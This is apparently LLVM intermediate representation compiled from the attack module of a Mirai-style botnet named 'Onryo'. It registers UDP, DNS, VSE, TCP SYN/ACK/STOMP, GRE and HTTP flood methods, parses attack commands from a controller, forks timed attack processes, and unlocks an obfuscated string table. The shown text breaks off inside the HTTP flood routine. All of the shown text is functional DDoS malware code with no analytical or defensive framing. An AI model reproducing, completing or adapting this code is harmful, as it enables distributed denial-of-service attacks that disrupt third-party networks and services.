; ModuleID = 'host/ir_O3/Onryo.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@methods_len = local_unnamed_addr global i8 0, align 1
@methods = local_unnamed_addr global %struct.attack_method** null, align 8
@attack_ongoing = local_unnamed_addr global [3 x i32] zeroinitializer, align 4
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@table = common local_unnamed_addr global [81 x %struct.table_value] zeroinitializer, align 16
@table_key = local_unnamed_addr global i32 -559038737, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() local_unnamed_addr #0 {
  tail call fastcc void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_generic)
  tail call fastcc void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_vse)
  tail call fastcc void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_dns)
  tail call fastcc void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_plain)
  tail call fastcc void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_syn)
  tail call fastcc void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_ack)
  tail call fastcc void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_stomp)
  tail call fastcc void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_gre_ip)
  tail call fastcc void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_gre_eth)
  tail call fastcc void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_app_http)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) unnamed_addr #0 {
  %3 = tail call noalias i8* @calloc(i64 1, i64 16) #9
  %4 = getelementptr inbounds i8, i8* %3, i64 8
  store i8 %0, i8* %4, align 8
  %5 = bitcast i8* %3 to void (i8, %struct.attack_target*, i8, %struct.attack_option*)**
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %5, align 8
  %6 = load i8*, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %7 = load i8, i8* @methods_len, align 1
  %8 = zext i8 %7 to i64
  %9 = shl nuw nsw i64 %8, 3
  %10 = add nuw nsw i64 %9, 8
  %11 = tail call i8* @realloc(i8* %6, i64 %10) #9
  %12 = bitcast i8* %11 to %struct.attack_method**
  store i8* %11, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %13 = load i8, i8* @methods_len, align 1
  %14 = add i8 %13, 1
  store i8 %14, i8* @methods_len, align 1
  %15 = zext i8 %13 to i64
  %16 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %15
  %17 = bitcast %struct.attack_method** %16 to i8**
  store i8* %3, i8** %17, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias i8* @realloc(i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() local_unnamed_addr #0 {
  %1 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 0), align 4
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @kill(i32 %1, i32 9) #9
  br label %5

; <label>:5:                                      ; preds = %0, %3
  store i32 0, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 0), align 4
  %6 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %7 = icmp eq i32 %6, 0
  br i1 %7, label %10, label %8

; <label>:8:                                      ; preds = %5
  %9 = tail call i32 @kill(i32 %6, i32 9) #9
  br label %10

; <label>:10:                                     ; preds = %8, %5
  store i32 0, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %11 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 2), align 4
  %12 = icmp eq i32 %11, 0
  br i1 %12, label %15, label %13

; <label>:13:                                     ; preds = %10
  %14 = tail call i32 @kill(i32 %11, i32 9) #9
  br label %15

; <label>:15:                                     ; preds = %13, %10
  store i32 0, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 2), align 4
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) local_unnamed_addr #0 {
  %3 = icmp ult i32 %1, 4
  br i1 %3, label %.thread80, label %4

; <label>:4:                                      ; preds = %2
  %5 = bitcast i8* %0 to i32*
  %6 = load i32, i32* %5, align 4
  %7 = tail call i32 @ntohl(i32 %6) #10
  %8 = icmp eq i32 %1, 4
  br i1 %8, label %.thread80, label %9

; <label>:9:                                      ; preds = %4
  %10 = getelementptr inbounds i8, i8* %0, i64 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i32 %1, 5
  br i1 %12, label %.thread80, label %13

; <label>:13:                                     ; preds = %9
  %14 = getelementptr inbounds i8, i8* %0, i64 5
  %15 = getelementptr inbounds i8, i8* %0, i64 6
  %16 = load i8, i8* %14, align 1
  %17 = add i32 %1, -6
  %18 = zext i8 %16 to i32
  %19 = icmp eq i8 %16, 0
  br i1 %19, label %.thread80, label %20

; <label>:20:                                     ; preds = %13
  %21 = sext i32 %17 to i64
  %22 = zext i8 %16 to i64
  %23 = mul nuw nsw i64 %22, 5
  %24 = icmp ult i64 %21, %23
  br i1 %24, label %.thread80, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %20
  %25 = tail call noalias i8* @calloc(i64 %22, i64 24) #9
  %26 = bitcast i8* %25 to %struct.attack_target*
  %27 = add nsw i32 %18, -1
  %28 = zext i32 %27 to i64
  %29 = mul nuw nsw i64 %28, 5
  %30 = add nuw nsw i64 %29, 11
  %scevgep = getelementptr i8, i8* %0, i64 %30
  %wide.trip.count = zext i8 %16 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph88.prol.loopexit, label %.lr.ph88.prol.preheader

.lr.ph88.prol.preheader:                          ; preds = %.lr.ph88.preheader
  br label %.lr.ph88.prol

.lr.ph88.prol:                                    ; preds = %.lr.ph88.prol.preheader
  %31 = bitcast i8* %15 to i32*
  %32 = load i32, i32* %31, align 4
  %33 = getelementptr inbounds i8, i8* %25, i64 16
  %34 = bitcast i8* %33 to i32*
  store i32 %32, i32* %34, align 4
  %35 = getelementptr inbounds i8, i8* %0, i64 10
  %36 = getelementptr inbounds i8, i8* %0, i64 11
  %37 = load i8, i8* %35, align 1
  %38 = getelementptr inbounds i8, i8* %25, i64 20
  store i8 %37, i8* %38, align 4
  %39 = bitcast i8* %25 to i16*
  store i16 2, i16* %39, align 4
  %40 = getelementptr inbounds i8, i8* %25, i64 4
  %41 = bitcast i8* %40 to i32*
  store i32 %32, i32* %41, align 4
  br label %.lr.ph88.prol.loopexit

.lr.ph88.prol.loopexit:                           ; preds = %.lr.ph88.preheader, %.lr.ph88.prol
  %indvars.iv91.unr = phi i64 [ 0, %.lr.ph88.preheader ], [ 1, %.lr.ph88.prol ]
  %.087.unr = phi i8* [ %15, %.lr.ph88.preheader ], [ %36, %.lr.ph88.prol ]
  %42 = icmp eq i8 %16, 1
  br i1 %42, label %._crit_edge, label %.lr.ph88.preheader.new

.lr.ph88.preheader.new:                           ; preds = %.lr.ph88.prol.loopexit
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88, %.lr.ph88.preheader.new
  %indvars.iv91 = phi i64 [ %indvars.iv91.unr, %.lr.ph88.preheader.new ], [ %indvars.iv.next92.1, %.lr.ph88 ]
  %.087 = phi i8* [ %.087.unr, %.lr.ph88.preheader.new ], [ %56, %.lr.ph88 ]
  %43 = bitcast i8* %.087 to i32*
  %44 = load i32, i32* %43, align 4
  %45 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 1
  store i32 %44, i32* %45, align 4
  %46 = getelementptr inbounds i8, i8* %.087, i64 4
  %47 = getelementptr inbounds i8, i8* %.087, i64 5
  %48 = load i8, i8* %46, align 1
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 2
  store i8 %48, i8* %49, align 4
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 0
  store i16 2, i16* %50, align 4
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 2, i32 0
  store i32 %44, i32* %51, align 4
  %indvars.iv.next92 = add nuw nsw i64 %indvars.iv91, 1
  %52 = bitcast i8* %47 to i32*
  %53 = load i32, i32* %52, align 4
  %54 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 1
  store i32 %53, i32* %54, align 4
  %55 = getelementptr inbounds i8, i8* %.087, i64 9
  %56 = getelementptr inbounds i8, i8* %.087, i64 10
  %57 = load i8, i8* %55, align 1
  %58 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 2
  store i8 %57, i8* %58, align 4
  %59 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 0
  store i16 2, i16* %59, align 4
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 2, i32 0
  store i32 %53, i32* %60, align 4
  %indvars.iv.next92.1 = add nsw i64 %indvars.iv91, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next92.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.unr-lcssa, label %.lr.ph88

._crit_edge.unr-lcssa:                            ; preds = %.lr.ph88
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph88.prol.loopexit, %._crit_edge.unr-lcssa
  %61 = mul nsw i32 %18, -5
  %62 = add i32 %17, %61
  %63 = icmp eq i32 %62, 0
  br i1 %63, label %.loopexit81.thread, label %64

; <label>:64:                                     ; preds = %._crit_edge
  %65 = load i8, i8* %scevgep, align 1
  %66 = icmp eq i8 %65, 0
  br i1 %66, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %64
  %67 = zext i8 %65 to i64
  %68 = tail call noalias i8* @calloc(i64 %67, i64 16) #9
  %69 = bitcast i8* %68 to %struct.attack_option*
  %70 = getelementptr inbounds i8, i8* %scevgep, i64 1
  %71 = add i32 %62, -1
  %72 = zext i8 %65 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %85
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %85 ]
  %.184 = phi i8* [ %70, %.lr.ph.preheader ], [ %91, %85 ]
  %.17583 = phi i32 [ %71, %.lr.ph.preheader ], [ %92, %85 ]
  %73 = icmp eq i32 %.17583, 0
  br i1 %73, label %.loopexit81.loopexit, label %74

; <label>:74:                                     ; preds = %.lr.ph
  %75 = load i8, i8* %.184, align 1
  %76 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 1
  store i8 %75, i8* %76, align 8
  %77 = icmp eq i32 %.17583, 1
  br i1 %77, label %.loopexit81.loopexit, label %78

; <label>:78:                                     ; preds = %74
  %79 = getelementptr inbounds i8, i8* %.184, i64 1
  %80 = getelementptr inbounds i8, i8* %.184, i64 2
  %81 = load i8, i8* %79, align 1
  %82 = add i32 %.17583, -2
  %83 = zext i8 %81 to i32
  %84 = icmp slt i32 %82, %83
  br i1 %84, label %.loopexit81.loopexit, label %85

; <label>:85:                                     ; preds = %78
  %86 = add nuw nsw i32 %83, 1
  %87 = zext i32 %86 to i64
  %88 = tail call noalias i8* @calloc(i64 %87, i64 1) #9
  %89 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 0
  store i8* %88, i8** %89, align 8
  tail call void @util_memcpy(i8* %88, i8* %80, i32 %83) #9
  %90 = zext i8 %81 to i64
  %91 = getelementptr inbounds i8, i8* %80, i64 %90
  %92 = sub nsw i32 %82, %83
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %93 = icmp slt i64 %indvars.iv.next, %72
  br i1 %93, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %85
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %64
  %.070 = phi %struct.attack_option* [ null, %64 ], [ %69, %.loopexit.loopexit ]
  %94 = tail call i32* @__errno_location() #10
  store i32 0, i32* %94, align 4
  tail call void @attack_start(i32 %7, i8 zeroext %11, i8 zeroext %16, %struct.attack_target* %26, i8 zeroext %65, %struct.attack_option* %.070)
  br label %.loopexit81

.loopexit81.loopexit:                             ; preds = %.lr.ph, %74, %78
  br label %.loopexit81

.loopexit81:                                      ; preds = %.loopexit81.loopexit, %.loopexit
  %.171 = phi %struct.attack_option* [ %.070, %.loopexit ], [ %69, %.loopexit81.loopexit ]
  %95 = icmp eq i8* %25, null
  br i1 %95, label %96, label %.loopexit81.thread

.loopexit81.thread:                               ; preds = %._crit_edge, %.loopexit81
  %.17195 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ null, %._crit_edge ]
  %.07393 = phi i8 [ %65, %.loopexit81 ], [ undef, %._crit_edge ]
  tail call void @free(i8* nonnull %25) #9
  br label %96

; <label>:96:                                     ; preds = %.loopexit81, %.loopexit81.thread
  %.17196 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ %.17195, %.loopexit81.thread ]
  %.07394 = phi i8 [ %65, %.loopexit81 ], [ %.07393, %.loopexit81.thread ]
  %97 = icmp eq %struct.attack_option* %.17196, null
  br i1 %97, label %.thread80, label %98

; <label>:98:                                     ; preds = %96
  %99 = zext i8 %.07394 to i32
  tail call fastcc void @free_opts(%struct.attack_option* nonnull %.17196, i32 %99)
  br label %.thread80

.thread80:                                        ; preds = %2, %4, %9, %13, %20, %96, %98
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

declare void @util_memcpy(i8*, i8*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) local_unnamed_addr #0 {
  %7 = tail call i32 @fork() #9
  %8 = icmp eq i32 %7, -1
  %9 = icmp sgt i32 %7, 0
  %or.cond = or i1 %8, %9
  br i1 %or.cond, label %10, label %11

; <label>:10:                                     ; preds = %6
  ret void

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @fork() #9
  switch i32 %12, label %.preheader [
    i32 -1, label %17
    i32 0, label %18
  ]

.preheader:                                       ; preds = %11
  %13 = load i8, i8* @methods_len, align 1
  %14 = icmp eq i8 %13, 0
  br i1 %14, label %.loopexit, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %15 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %16 = zext i8 %13 to i64
  br label %24

; <label>:17:                                     ; preds = %11
  tail call void @exit(i32 0) #11
  unreachable

; <label>:18:                                     ; preds = %11
  %19 = tail call i32 @sleep(i32 %0) #9
  %20 = tail call i32 @getppid() #9
  %21 = tail call i32 @kill(i32 %20, i32 9) #9
  tail call void @exit(i32 0) #11
  unreachable

; <label>:22:                                     ; preds = %24
  %23 = icmp slt i64 %indvars.iv.next, %16
  br i1 %23, label %24, label %.loopexit.loopexit

; <label>:24:                                     ; preds = %.lr.ph, %22
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %22 ]
  %25 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %15, i64 %indvars.iv
  %26 = load %struct.attack_method*, %struct.attack_method** %25, align 8
  %27 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %26, i64 0, i32 1
  %28 = load i8, i8* %27, align 8
  %29 = icmp eq i8 %28, %1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %29, label %30, label %22

; <label>:30:                                     ; preds = %24
  %31 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %26, i64 0, i32 0
  %32 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %31, align 8
  tail call void %32(i8 zeroext %2, %struct.attack_target* %3, i8 zeroext %4, %struct.attack_option* %5) #9
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %22
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %30
  tail call void @exit(i32 0) #11
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @free_opts(%struct.attack_option*, i32) unnamed_addr #0 {
  %3 = icmp eq %struct.attack_option* %0, null
  br i1 %3, label %11, label %.preheader

.preheader:                                       ; preds = %2
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %9
  %indvars.iv = phi i64 [ %indvars.iv.next, %9 ], [ 0, %.lr.ph.preheader ]
  %5 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %0, i64 %indvars.iv, i32 0
  %6 = load i8*, i8** %5, align 8
  %7 = icmp eq i8* %6, null
  br i1 %7, label %9, label %8

; <label>:8:                                      ; preds = %.lr.ph
  tail call void @free(i8* nonnull %6) #9
  br label %9

; <label>:9:                                      ; preds = %.lr.ph, %8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %9
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %10 = bitcast %struct.attack_option* %0 to i8*
  tail call void @free(i8* %10) #9
  br label %11

; <label>:11:                                     ; preds = %2, %._crit_edge
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #4

declare i32 @sleep(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i8* readnone) local_unnamed_addr #5 {
  %5 = icmp eq i8 %0, 0
  br i1 %5, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %6 = zext i8 %0 to i64
  br label %.lr.ph

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp slt i64 %indvars.iv.next, %6
  br i1 %8, label %.lr.ph, label %.loopexit.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %7
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %7 ]
  %9 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 1
  %10 = load i8, i8* %9, align 8
  %11 = icmp eq i8 %10, %2
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %11, label %12, label %7

; <label>:12:                                     ; preds = %.lr.ph
  %13 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 0
  %14 = load i8*, i8** %13, align 8
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %7
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %12
  %.09 = phi i8* [ %14, %12 ], [ %3, %4 ], [ %3, %.loopexit.loopexit ]
  ret i8* %.09
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @util_atoi(i8* nonnull %5, i32 10) #9
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

declare i32 @util_atoi(i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @inet_addr(i8* nonnull %5) #9
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target* nocapture readonly, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca [10241 x i8], align 16
  %7 = alloca %struct.fd_set, align 8
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %9 to %struct.timeval*
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca [10240 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 21, i8* null)
  %15 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %16 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 8, i8* null)
  %17 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 24, i32 1)
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 80)
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %21, i8 0, i64 10241, i32 16, i1 false)
  %22 = icmp eq i8* %16, null
  %23 = icmp eq i8* %17, null
  %or.cond = or i1 %22, %23
  br i1 %or.cond, label %1018, label %24

; <label>:24:                                     ; preds = %4
  %25 = tail call i32 @util_strlen(i8* %17) #9
  %26 = icmp sgt i32 %25, 255
  br i1 %26, label %1018, label %27

; <label>:27:                                     ; preds = %24
  %28 = tail call i32 @util_strlen(i8* %16) #9
  %29 = icmp sgt i32 %28, 127
  br i1 %29, label %1018, label %30

; <label>:30:                                     ; preds = %27
  %31 = tail call i32 @util_strlen(i8* %15) #9
  %32 = icmp sgt i32 %31, 9
  br i1 %32, label %1018, label %.preheader617

.preheader617:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %33 = tail call i32 @util_strlen(i8* %15) #9
  %34 = icmp sgt i32 %33, 0
  br i1 %34, label %.lr.ph657.preheader, label %._crit_edge658

.lr.ph657.preheader:                              ; preds = %.preheader617
  br label %.lr.ph657

.lr.ph657:                                        ; preds = %.lr.ph657.preheader, %42
  %35 = phi i32 [ %44, %42 ], [ 0, %.lr.ph657.preheader ]
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %15, i64 %36
  %38 = load i8, i8* %37, align 1
  %.off606 = add i8 %38, -97
  %39 = icmp ult i8 %.off606, 26
  br i1 %39, label %40, label %42

; <label>:40:                                     ; preds = %.lr.ph657
  %41 = add i8 %38, -32
  store i8 %41, i8* %37, align 1
  %.pre = load i32, i32* %5, align 4
  br label %42

; <label>:42:                                     ; preds = %.lr.ph657, %40
  %43 = phi i32 [ %35, %.lr.ph657 ], [ %.pre, %40 ]
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %5, align 4
  %45 = tail call i32 @util_strlen(i8* nonnull %15) #9
  %46 = icmp slt i32 %44, %45
  br i1 %46, label %.lr.ph657, label %._crit_edge658.loopexit

._crit_edge658.loopexit:                          ; preds = %42
  br label %._crit_edge658

._crit_edge658:                                   ; preds = %._crit_edge658.loopexit, %.preheader617
  %47 = icmp slt i32 %18, 500
  %. = select i1 %47, i32 %18, i32 500
  tail call void @table_unlock_val(i8 zeroext 36)
  tail call void @table_unlock_val(i8 zeroext 37)
  tail call void @table_unlock_val(i8 zeroext 38)
  tail call void @table_unlock_val(i8 zeroext 39)
  tail call void @table_unlock_val(i8 zeroext 40)
  tail call void @table_unlock_val(i8 zeroext 41)
  tail call void @table_unlock_val(i8 zeroext 42)
  tail call void @table_unlock_val(i8 zeroext 43)
  tail call void @table_unlock_val(i8 zeroext 44)
  tail call void @table_unlock_val(i8 zeroext 45)
  tail call void @table_unlock_val(i8 zeroext 46)
  %48 = sext i32 %. to i64
  %49 = tail call noalias i8* @calloc(i64 %48, i64 3140) #9
  %50 = bitcast i8* %49 to %struct.attack_http_state*
  %51 = icmp sgt i32 %18, 0
  br i1 %51, label %.lr.ph656, label %.preheader615

.lr.ph656:                                        ; preds = %._crit_edge658
  %52 = zext i8 %0 to i32
  br label %64

.preheader615.loopexit:                           ; preds = %95
  br label %.preheader615

.preheader615:                                    ; preds = %.preheader615.loopexit, %._crit_edge658
  %53 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 0
  %54 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 0
  %55 = bitcast %struct.sockaddr_in* %10 to i8*
  %56 = bitcast i32* %5 to i8*
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 0
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 2, i32 0
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 1
  %60 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %61 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 0
  %62 = icmp ne i8* %14, null
  %63 = bitcast i32* %12 to i8*
  %.not = icmp slt i32 %18, 1
  br label %.backedge616

